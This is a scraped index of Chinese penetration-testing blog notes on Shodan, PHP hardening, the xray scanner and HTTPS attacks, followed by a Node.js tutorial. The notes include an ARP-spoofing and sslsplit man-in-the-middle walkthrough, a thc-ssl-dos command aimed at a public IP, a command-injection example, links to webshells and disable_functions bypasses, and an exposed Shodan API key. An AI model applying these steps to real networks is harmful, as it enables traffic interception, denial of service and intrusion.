3.脚本使用 （建议使用本地脚本，也可自主开发） 项目地址：https://github.com/achillean/shodan-python 先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就 shodan search product:\"apache\" 只不过显示方式不友好 拓展：自主开发 官方文档：https://shodan.readthedocs.io/en/latest/index.html from shodan import Shodan api = Shodan(\"cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf\") # Lookup an IP ipinfo = api.host('8.8.8.8') print(ipinfo) # Search for websites that have been \"hacked\" for banner in api.search_cursor('ch1_http相关.title:\"hacked by\"'): print(banner) # Get the total number of industrial control systems services on the Internet ics_services = api.count('tag:ics') print('Industrial Control Systems: {}'.format(ics_services['total'])) 案例测试： 1.phpstudy采集 头部信息 Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 2.子域名信息采集 hostname:\"xps.cn\" 3.特定漏洞靶机采集 vuln:CVE-2020-1983 普通用户没权限用 二. zoomeye 对国内更贴近一些 内置语法 ZoomEye搜索技巧 指定搜索的组件以及版本 app：组件名称 ver：组件版本 例如：搜索 apache组件 版本2.4 app:apache ver:2.4 指定搜索的端口 port:端口号 例如：搜索开放了SSH端口的主机 port:22 一些服务器可能监听了非标准的端口。 要按照更精确的协议进行检索，可以使用service进行过滤。 指定搜索的操作系统 OS:操作系统名称 例如：搜索Linux操作系统 OS：Linux 指定搜索的服务 service：服务名称 例如，搜素SSH服务 Service：SSH 指定搜索的地理位置范 country：国家 city：城市名 例如： country:China city：Beijing 搜索指定的CIDR网段 CIDR:网段区域 例如： CIDR：192.168.158.12/24 搜索指定的网站域名 Site:网站域名 例如： site:www.baidu.com 搜索指定的主机名 Hostname:主机名 例如： hostname:zwl.cuit.edu.cn 搜索指定的设备名 Device：设备名 例如： device:router 搜索具有特定首页关键词的主机 Keyword：关键词 例如： keyword:technology 脚本开发(多语言开发) 官方手册:https://www.zoomeye.org/doc 1.登录授权 2.请求搜索 3.回显数据 补充：谷歌黑客高级玩法 https://www.uedbox.com/shdb/ https://www.uedbox.com/post/54776/ ","date":"2020-03-29","objectID":"/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/:0:0","tags":["渗透测试","黑暗引擎"],"title":"黑暗引擎","uri":"/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/"},{"categories":["渗透测试"],"content":"PHP.INI与WEB安全 ","date":"2020-03-29","objectID":"/php%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/:1:0","tags":["渗透测试","php.ini"],"title":"PHP常见安全设置","uri":"/php%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"categories":["渗透测试"],"content":"四种防护 1.magic_quotes_gpc 魔术引号： 过滤转义四种字符（），对于sql注入有过滤作用 绕过： 特定条件下可以尝试 宽字节注入 2.safe_mod 安全模式，官方自带的 安全模式： 禁止php中敏感函数，防御提权及后门调用，漏洞利用 一些敏感函数被禁用 有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用 3.open_basedir 启用之后： open_basedir=D:\\phpstudy\\PHPTutorial\\WWW` 限制后门的访问指定目录（菜刀连上也看不到目录里面） 没办法绕过 4.disable_function 可自定义禁用函数：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活 dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link 举例： disable_function = eval,system,fopen,fread,readdir,init_set //比如禁用某指定函数的做法 // 可以直接封杀大马小马等后门disable_functiondisable_function 绕过 disable_function的突破: 方法1： 蚁剑及插件(绕过disable_function)使用, 加载插件 插件会保存到antData/plugin目录 现在好像已经不用自己下载这个插件了 参考文章: https://www.cnblogs.com/linuxsec/articles/10966675.html 方法2： 针对php7.x:（不支持windows） https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php 方法3： 脚本集合： https://github.com/l3m0n/Bypass_Disable_functions_Shell http://webshell8.com/down/phpwebshell.zip 方法4： 一些webshell自带绕过功能 其他 目录权限 文件解析 … … ","date":"2020-03-29","objectID":"/php%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/:1:1","tags":["渗透测试","php.ini"],"title":"PHP常见安全设置","uri":"/php%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"categories":["渗透测试"],"content":"xray学习 平时使用webscan是最多的 结合基础爬虫 xray.exe webscan --basic-crawler http://xxxxx # 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里） ","date":"2020-03-29","objectID":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:0","tags":["渗透测试","xray"],"title":"xray简单学习","uri":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"基本使用 代理 原理 设置代理步骤 其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：ca.crt, 然后安装证书 生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等 ","date":"2020-03-29","objectID":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:1:0","tags":["渗透测试","xray"],"title":"xray简单学习","uri":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"高级用法 1.常用配置 配置文件：config.yaml 允许扫描的域 Mitm -\u003e Restriction 默认会把所有流量扫描，可以指定我们想要扫描的域名的流量 includes允许扫描的域，*表示任意；excludes不允许扫描的域 为代理添加认证 Mitm -\u003eauth 如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码 扫描插件配置 Plugins 插件可以打开(enable:true)和关闭(false),也可以自定义字典等 或者直接在命令行指定启用哪些插件：--plugins xss,xxe 发包速率限制 http -\u003e max_qps 限制扫描速度，防止被waf拉黑 扫描代理配置 http -\u003e proxy 代理支持以下形式 #1.http代理 http: proxy: \"http://127.0.0.1:8080\" # 漏洞扫描时使用的代理 #2.socks代理 http: proxy: \"socks5://127.0.0.1:1111\" # 漏洞扫描时使用的代理 log如果改成debug，可以看到具体发包请求详情： 也可以设置cookie 大致配置项： 2.xray与burp联动使用 （1）Burpsuite作为xray的上游代理（抓取xray发包来学习） 作用： burp可以拿到xray的数据包（可以学习xray是如何检测的的） 设置方法： xray设置代理: http://127.0.0.1:8080 burp监听8080端口 启动xray，设置监听端口为--listen 127.0.0.1:1111 浏览器配置代理为1111 （2）xray作为Burpsuite的上游代理（协助测试） 作用： burp可以选择是否放行，forward之后，可以用xray进行扫描 设置方法： xray配置文件不配置代理 burp正常设置监听8080端口 burp打开user option -\u003e Upstream Proxy Server -\u003e 添加为:127.0.0.1:1111 浏览器设置burp代理8080 启动xray，设置监听端口为--listen 127.0.0.1:1111 其他方式： 使用插件 ","date":"2020-03-29","objectID":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:2:0","tags":["渗透测试","xray"],"title":"xray简单学习","uri":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"使用xray编写自定义poc xray是用go语言开发的 poc是yaml格式的 原理 每个规则都是http请求，进行改造 POC构成 name rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包) details：漏洞检测成功之后，输出一些提示信息 具体操作 看官方文档 vscode和jetBrain都行 vscode安装YAML查看，配置文件setting.json用来校验 按照上面的格式编写 运行：xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111 对单个url扫描： --url http://www.test.com 更好用 Note: phantasm这里是在命令行启用 详细内容查看官方文档 调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包 ","date":"2020-03-29","objectID":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:3:0","tags":["渗透测试","xray"],"title":"xray简单学习","uri":"/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"常见的管道符： Windows： | 直接执行后面的语句 || 如果前面出错（即为false），就执行后面的语句（前面只能为假） \u0026 如果前面的语句为假则直接执行后面的语句（前面可真可假） \u0026\u0026 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） Linux： ; 执行完前面再执行后面 | 显示后面语句的执行结果 || 前面语句出错时，执行后面的语句 \u0026 如果前面的语句为假则直接执行后面的语句（前面可真可假） \u0026\u0026 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） 命令执行简介 程序如果提供执行 命令的功能 比如提供了ping的功能： 输入 ping | dir, 利用了管道符执行了dir php中常见的执行系统 命令的函数： system, exec, shell_exec, passthru, popen, proc_popen 修复建议 尽量不要使用系统命令执行函数 对客户端提交的变量进行过滤和检测 使用动态函数之前，确保使用的函数是置顶的函数之一 对php来说，不能完全控制的危险函数最好不要使用 ","date":"2020-03-29","objectID":"/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/:0:0","tags":["常见的管道符","渗透测试"],"title":"常见的管道符","uri":"/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/"},{"categories":["渗透测试"],"content":"HTTPS攻击 防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) https攻击方法 降级攻击 解密攻击（明文、证书伪造）– 劫持 协议漏洞、实现方法的漏洞、配置不严格 常识 SSL（安全套接层, Secure socket layer）,后来使用TSL取代了SSL，只不过习惯了叫SSL SSL/TLS也被用于其他场景的传输通道加密： 邮件传输（服务器间、客户端与服务器间） 数据库服务器间 LDAP身份认证服务器间 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 Web通信中SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） 常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec **加密过程：**握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输 非对称加密算法 非对称加密一般用来加密比较小的数据 例如：RSA, ECC等 对称加密算法 DES/3DES, AES, IDEA, RC4 …… 单向加密算法(Hash) Hash算法 Hash值长度(bit) MD5 128 SHA-1 160 SHA-2 224,256,384,512 SSL的弱点 SSL是不同的对称、非对称、单项加密算法的组合加密实现(cipher suite) 服务器端为提供更好的兼容性，选择支持大量过时cipher suite 协商过程中墙皮降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法 购买云计算资源破解 实践 查看web站点用了啥样的ssl协议，什么版本，什么组合 1.openssl命令 openssl s_client --connect www.baidu.com:443 #证书颁发机构也是树形结构的，有一级二级 #指定查看是否支持某协议和组合 openssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443 # 测试是否可以跟已知的不安全的cipher suite建立连接 openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443 # 已知的不安全的组合cipher suite openssl ciphers -v 'NULL,EXPORT,LOW,DES' # 参考网站（加密技术） https://www.openssl.org/docs/apps/ciphers.html Openssl需要大量密码学相关知识，命令复杂，结果可读性差 2.SSLScan工具 自动识别ssl配置错误、过期协议、过时cipher suite和hash算法 默认会检查CRIME、心脏出血漏洞 绿色表示安全，红色黄色需要引起注意 查看TLS支持的cipher suite # 检查所有的支持的tls是否有不安全的 sslscan --tlsall www.taobao.com:443 # Altnames选项下面的域名也可以使用上面域名的证书 分析证书详细信息 sslscan --show-certificate -no-ciphersuites www.taobao.com:443 3.SSLyze工具 Python编写 检查ssl过时版本 检查存在弱点的cipher suite 扫描多站点时，支持来源文件(多个站点放到一个文件里面) 检查是否支持会话恢复 sslyze --regular www.supercomputerboytony.cn 4.Nmap # 枚举cipher suite nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn 5. 在线网站： 输入域名，对SSL进行检测 https://www.ssllabs.com/ssltest SSL中间人攻击 概述 攻击者位于客户端和服务器通信链路中 1.ARP欺骗（最常用） 2.DHCP 如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播) 3.修改网关 4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置) 5.修改HOSTS 6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议) —\u003e如果处在同一局域网 不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习 加密流量 ps：下来的演示，是基于ARP欺骗的： 利用 攻击的前提 客户端已经信任了伪造证书颁发机构 攻击者控制了核发证书颁发机构（CA证书服务器） 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 工具 对已经实现中间人欺骗(这里用arpspoof)后，下面的工具对信息进行解密 1.SSLsplit工具 透明SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（利用openssl来生成伪造的证书） 支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击 1). openssl # 1.利用openssl生成证书私钥 openssl genrsa -out ca.key 2048 # 2.利用私钥签名生成证书(生效时间,使用的私钥文件) -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的 openssl req -new -x509 -days 1096 -key ca.key -out ca.crt # 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实） 2).攻击机器设置路由转发 下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）： 做个地址转换, 比如: 把我计算机443端口收到的数据包转发到8443端口 # 先查看要用到的端口有没有被占用 netstst -pantu |grep :80 # 查看nat表 iptables -t nat -L # -F 清空 iptables -t nat -F # 端口转发命令（PREROUTING在路由之前,-p协议, -j操作） iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443 iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443 # MSA iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443 # SMTPS 发邮件 iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443 # IMAPS 收邮件 iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 #POP3S #其他使用ssl协议加密的协议端口一样 iptables -L 3).ARP欺骗 # -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址 arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 #可以发现：受害者机器上关于网关的mac已经换成了kali的 4).启动SSLsplit mkdir -p test/logdir # -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听 sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 # 所有操作完成了 然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览) 我们可以查看日志和浏览器证书以及证书保存信息(cat connect.log) , 具体通信数据在:ls test/logdir, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分） 通过关键词查找内容：grep xxx *.log这样 在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了) 全站https/非全站https（比如只是登录等部分页面加了https） 2.Mitmproxy工具 设置路由表转发规则 # bug: 只能在8080端口监听，所以需要修改规则 iptables -t nat -F iptables -t nat -A PRER","date":"2020-03-29","objectID":"/https%E6%94%BB%E5%87%BB/:0:0","tags":["渗透测试","HTTPS攻击"],"title":"HTTPS攻击","uri":"/https%E6%94%BB%E5%87%BB/"},{"categories":["渗透测试"],"content":"SSL/TLS拒绝服务攻击 和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源 Note: SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载 与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/s SSL握手请求 利用 thc-ssl-dos工具 #使用 thc-ssl-dos 199.223.209.205 2083 -accept dig命令，解析ip地址 ","date":"2020-03-29","objectID":"/https%E6%94%BB%E5%87%BB/:1:0","tags":["渗透测试","HTTPS攻击"],"title":"HTTPS攻击","uri":"/https%E6%94%BB%E5%87%BB/"},{"categories":["渗透测试"],"content":"补充概念 Ajax Asynchronous JavaScript and XML 是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 Ajax组件 JavaScript(ajax的核心组件) Dynamic HTML(DHTML) DOM ajax框架： jQuery Dojo Tookit Google Web toolkit Microsoft Ajax library 基于Ajax的Web应用工作流程 使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax的安全问题 多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 Ajax对渗透测试的挑战 异步请求数量多且隐蔽 触发Ajax请求的条件无规律 手动和阶段大力爬网可能产生大量遗漏 检查方法： 手动查看页面源代码有没有使用ajax（效率低一些） 浏览器打开审查元素：net –\u003e XHR / net –\u003e javascript 使用ZAP，使用ajax爬站功能 Web Service 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景 无页面 两种类型： SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全） – Simple object access protocol RESTful (json是首选的数据交换格式刷) web service安全考虑： 使用API key或session token实现和跟踪身份认证 身份认证由服务器完成，而非客户端 API key, 用户名, Session token 永远不要通过URL发送 RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOAP提供强于HTTPS的WS-security机制 使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key RESTful应只允许身份认证用户使用PUT、DELETE方法 使用所及token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证(电商公司以ID作为主索引) ","date":"2020-03-29","objectID":"/https%E6%94%BB%E5%87%BB/:2:0","tags":["渗透测试","HTTPS攻击"],"title":"HTTPS攻击","uri":"/https%E6%94%BB%E5%87%BB/"},{"categories":["Node.js"],"content":"Node.js是一个机遇Chrome V8引擎的JavaScript运行环境 Node.js的包管理器npm，是全球最大的开源生态库系统 Node.js可解析js代码，没有浏览器安全级别的限制 ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:0:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"一.开发环境配置 官网： https://nodejs.org/en/ API文档：http://nodejs.cn/api/events.html 如果需要安装多个版本 1).docker 2).使用nvm来安装并维护（推荐） 项目地址：https://github.com/nvm-sh/nvm # 1.安装nvm curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash # 2.配置环境变量 #linux下 .bash_profile或.bash_rc export NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] \u0026\u0026 printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\" [ -s \"$NVM_DIR/nvm.sh\" ] \u0026\u0026 \\. \"$NVM_DIR/nvm.sh\" # This loads nvm # windows系统。。。 3.配置加速镜像： # 同样在上面的配置文件 export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node 安装node # 安装指定版本 nvm install 8.0.0 # 或安装最新的稳定版本 nvm install --lts # 或安装最新的版本 nvm install node # 查看安装的版本 nvm ls # 查看当前版本 node -v # 切换版本 nvm use 6.11.2 体验一下 在终端进入node命令行：node, 之后可以输入js代码了 在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有dom和bom的操作) 比如，查看本地进程process 执行文件：node index.js 不用每次写完都运行命令来执行 安装nodemon, 实时侦测文件的变化 npm install nodemon -g # 全局安装 npm使用国内源： # 永久 npm config set registry https://registry.npm.taobao.org 或安装使用cnpm命令 使用nodemon： nodemon index.js # 这样就可以实时侦测了 使用其他版本node来运行脚本 # 1.指定版本来运行 nvm run 6.1.2 index.js #2.使用配置文件 .nvmrc #内容直接写版本号， 6.1.2 # nmp use #接下来运行就可以了 node index.js ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:1:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"二. 模块(包)与CommonJS Node.js三种模块 内置的Node.js模块 const os = require('os') // require 载入模块 console.log(os.hostname()); // 显示主机名 第三方的Node.js模块(https://www.npmjs.com) ​ 把包用npm引进来（可以创建配置文件来管理npm init ,根据情况填写回撤，会自动创建package.json） ​ 在命令行输入npm install request --save 安装在配置信息的依赖dependencies里 ​ 会在我们的包里面自动创建一个文件夹node_modules, 我们安装的包就会在里面了 ​ 载入模块同上 ​ 然后开始使用第三方模块 const request = require('request') //自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找 request({ url: 'https://api.douban.com/v2/movies/top250', json:true, }, (error, response, body) =\u003e { console.log(JSON.stringfy(body, null, 2)); }); 自定义的Node.js模块（要按照CommonJS规范） 新建一个目录src,里面新建一个js文件(模块) //自定义模块 const hello = () =\u003e{ console.log(\"hello~\"); } //暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法) module.exports.hello = hello 调用 const greet = require(\"./src/greeting.js\") greet.hello() ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:2:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"三. NPM-包管理工具 npm使用 npm -v npm info 镜像源 # 查看 npm config get registry # 设置 npm config set registry http://registry.npmjs.org 升级node # npm install n -g 查看当前目录下安装了哪些node包 npm ls 查看当前npm用户 npm whoami npm清理缓存 npm cache clean -f npm安装模块 # i = install npm i forever -g # 全局 npm install xxx # 利用 npm 安装xxx模块到当前命令行所在目录； npm install -g xxx # 利用npm安装全局模块xxx； npm install xxx # 安装但不写入package.json； npm install xxx –save # 安装并写入package.json的”dependencies”中； npm install xxx –save-dev # 安装并写入package.json的”devDependencies”中。 npm 删除模块 npm uninstall xxx # 删除xxx模块； npm uninstall -g xxx # 删除全局模块xxx； 更新模块 npm update 检查模块是否已经过时 npm outdated 在项目中引导创建一个package.json文件 npm init 发布模块 npm publish 查看node安装路径 查看node安装路径 npm scripts 配置文件中 \"scripts\": { \"test\": \"echo \\\"Error: no test sspecified\\\" \u0026\u0026 exit 1\" \"build\": \"node async.js\" }, 按照上面配置完之后，运行只需：npm run build 优点： 功能相同，可以使用同一个脚本 详细的下来查文档 ","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:3:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"四.深入浅出Node核心模块API 1). url 记得要导入模块 1.parse url.parse(urlStr, [parseQueryString], [slashesDenoteHost]) url.parse(\"https://www.baidu.com\") # 井号后面是hash url.parse(\"https://www.baidu.com:8080/api.php?from=xp\u0026course=node#level\") #第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为false url.parse(\"https://www.baidu.com\"， true) #第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 { host: ‘foo', pathname: ‘/bar' } url.parse(\"https://www.baidu.com\"， true,true) 2.format 将一个解析后的URL对象、转成、一个格式化的URL字符串。 url.format(urlObj) var url = require('url'); var a = url.format({ protocol : 'http' , auth : null , host : 'example.com:8080' , port : '8080' , hostname : 'example.com' , hash : null , search : '?a=index\u0026t=article\u0026m=default', query : 'a=index\u0026t=article\u0026m=default', pathname : '/one', path : '/one?a=index\u0026t=article\u0026m=default', href : 'http://example.com:8080/one?a=index\u0026t=article\u0026m=default' }); console.log(a); //输出结果：http://example.com:8080/one?a=index\u0026t=article\u0026m=default 3.resolve 为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url url.resolve(from, to) var url = require('url'); var a = url.resolve('/one/two/three', 'four') , b = url.resolve('http://example.com/', '/one'), c = url.resolve('http://example.com/one', '/two'); console.log(a +\",\"+ b +\",\"+ c); //输出结果： ///one/two/four //http://example.com/one //http://example.com/two 2). QueryString 1.querystring.escape(str) 转义为url编码 querystring.escape('\u003c大家好\u003e') 2.querystring.unescape(str) 反转义 querystring.unescape('%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E') 3.querystring.stringify(obj,[, seq[, eq[, options]]]) 序列化 1. querystring.stringify({name:'chenshuai',ago:21,job:\"web\"}) 2. querystring.stringify({name:'chenshuai',ago:21,job:\"web\"},\".\") //第二个参数可以修改连接的\u0026 3. querystring.stringify({name:'chenshuai',ago:21,job:\"web\"},\".\",\":\")//第三个参数可以修改key与value之间的字符串 4.querystring.parse(str[, sep[, eq[, options]]]) 反序列化 // querystring.parse('字符串','\u0026','=') //默认状态(字符串,分隔符,键与值) 1. querystring.parse('name=chenshuai\u0026ago=21\u0026job=web') 2.querystring.parse('name=chenshuai.ago=21.job=web','.')//返序列化时要注意格式 3.querystring.parse('name:chenshuai.ago:21.job:web','.',':') 3).http(s) 模块 1.get方法 案例，http小爬虫 var http = require('http') var https = require('https') //https网站使用(和http的方法是一样的) var cherio = require('cherio') // 类似于jQuery var url = \"https://www.lagou.com\" // 解析源代码 function parseMenu(html){ //先导入html，然后再进行处理 var $ = cherio.load(html) var menu = $('.category-list') var menuData = [] menu.each(function(index,value){ //遍历 var menuTitle = $(value).find('h2').text() //一级标题 var menuLists = $(value).find('a') var menuList = [] menuLists.each(function(inde, val){ //遍历 menuList.push($(val).text()) //a元素的text }) menuData.push({ menuTitle:menuTitle, menuList:menuList }) }) return menuData } //打印 function printMenu(menu) { menu.forEach(function(val){ console.log(val.menuTitle + '\\n'); val.menuList.forEach(function(value){ console.log(value); }) }) } // get请求 https.get(url, function(res){ var html = ''; res.on('data', function(data){ html += data; }) res.on('end', function(){ // 打印的是网页源代码 //console.log(html); var result = parseMenu(html) printMenu(result) }) res.on('error', function(err){ console.log(err); }) }) 2.Request方法 GET获取异步数据 //Http模块的request方法的get来获取异步数据 豆瓣电影Top250 const https = require('https') var options = { hostname: 'douban.uieee.com', port: 443, method: 'GET', path: '/v2/movie/top250' } var responseData = '' var request = https.request(options, (response) =\u003e{ response.setEncoding('utf8') response.on('data', (chunk)=\u003e{ responseData += chunk }) response.on('end',()=\u003e{ JSON.parse(responseData).subjects.map((item) =\u003e{ console.log(item.title); // 第一页的电影标题 }) }) }) request.on('error', (error)=\u003e{ console.log(error); }) request.end() POST方法提交表单 //Http模块的request方法的post方法提交表单 const http = require('http') const qs = require('querystring') //序列化 var postData = querystring.stringfy({ 'question[title]':'哈哈哈', 'question[content]':'我的内容' }) var options = { hostname: 'www.codingke.com', port: 80, method: 'POST', path: '/ajax/course/question' headers: { // 因为登录之后才能提交，所有这里... 'Cookie':'","date":"2020-03-27","objectID":"/node-js-%E5%85%A5%E9%97%A8/:4:0","tags":["Node.js","编程"],"title":"Node.js 入门","uri":"/node-js-%E5%85%A5%E9%97%A8/"},{"categories":["Node.js"],"content":"五.使用Node创建后端路由 使用supervisor运行 # 安装： npm install supervisor -g # 运行 supervisor router_1.js 最简单路由 router_1.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) =\u003e { res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\\//,'') //http://localhost:8000/login就是login console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js module.exports = { home: (req, res) =\u003e { res.write(\"欢迎来到首页\") // 默认路由 }, login: (req, res) =\u003e { res.write(\"登录界面\") // 处理路由 }, registor: (req, res) =\u003e { res.write(\"注册界面\") // 处理路由 } } 读取图片 router_02.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) =\u003e { res.writeHead(200, {'Content-Type':'image/jpeg'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\\//,'') //http://localhost:8000/login就是login console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js var file = require('./file.js') module.exports = { home: (req, res) =\u003e { res.write(\"欢迎来到首页\") // 默认路由 }, login: (req, res) =\u003e { res.write(\"登录界面\") // 处理路由 }, registor: (req, res) =\u003e { res.write(\"注册界面\") // 处理路由 }, img: (req, res) =\u003e { //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) } } file.js var fs = require('fs') module.exports = { readImg: (file, res) =\u003e { fs.readFile(file, 'binary', (err, data) =\u003e { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } 文字和图片一起显示 使用html文件 views/home.html \u003c!\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e 